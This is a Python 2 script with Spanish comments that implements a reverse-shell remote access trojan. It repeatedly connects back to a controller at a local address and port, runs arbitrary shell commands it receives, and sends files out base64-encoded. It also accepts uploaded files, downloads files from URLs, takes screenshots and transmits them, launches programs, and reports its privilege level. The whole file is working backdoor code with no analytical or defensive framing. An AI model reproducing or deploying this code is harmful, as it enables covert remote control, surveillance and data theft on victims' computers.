#!/usr/bin/env python
#_*_ coding: utf8 _*_

import socket
import os
import subprocess
import base64
import requests
import pyautogui
import time
def revisar_privilegios():
	global admin
	try:
		#os.environ revisalas rutas que podemos ver si eres admin
		check = os.listdir(os.sep.join([os.environ.get("PATH")]))
	except:
		admin = "Privilegios Insuficientes"
	else:
		admin = "Privilegios de Administrador"



def descargar_de_internet(url):
	query = requests.get(url)
	nombre_archivo = url.split("/")[-1]
	with open(nombre_archivo,"wb") as obterner_archivo:
		obterner_archivo.write(query.content)

#mejorar el capturador
def capturar_pantalla():
	screen = pyautogui.screenshot()
	screen.save("monitor-1.png")

def conexion():
	while True:
		time.sleep(5)
		try:
			cliente.connect(('127.0.0.2', 2000))
			terminal()
		except:
			conexion()

def terminal():
	directorio = os.getcwd()

	cliente.send(directorio)

	while True:
		res = cliente.recv(1024)
		if res == "exit":
			break
		#uso de cd para el movi
		elif res[:2] == "cd" and len(res) > 2:
			os.chdir(res[3:])
			resultado = os.getcwd()
			cliente.send(resultado)
		elif res[:9] == "descargar":
			with open(res[10:], "rb") as ar_descargar:
				cliente.send(base64.b64encode(ar_descargar.read()))
		elif res[:4] == "sube":
			with open(res[5:], "wr") as subir:
				datos = cliente.recv(100000)
				subir.write(base64.b64decode(datos))
		elif res[:5] == "bajar":
			try:
				descargar_de_internet(res[6:])
				cliente.send("Archivo Descargado")
			except:
				cliente.send("Error la Descargar el archivo")
		elif res[:7] == "captura":
			try:
				capturar_pantalla()
				with open("monitor-1.png", "rb") as enviar_captura:
					cliente.send(base64.b64encode(enviar_captura.read()))
					os.remove("monitor-1.png")
			except:
				cliente.send(base64.b64encode("Error"))
		elif res[:7] == "iniciar":
			try:
				subprocess.Popen(res[6:], shell=True)
				cliente.send("Programa iniciado con Exito")

			except:
				cliente.send("No se ha podido iniciar el programa")
		elif res[:6] == "revisar":
			try:
				revisar_privilegios()
				cliente.send(admin)
			except:
				cliente.send(admin)
		else:
			proc = subprocess.Popen(res, shell=True, stdout= subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
			resultado = proc.stdout.read() + proc.stderr.read()
			if len(resultado) == 0:
				cliente.send("1")
			else:
				cliente.send(resultado)

cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conexion()
cliente.close()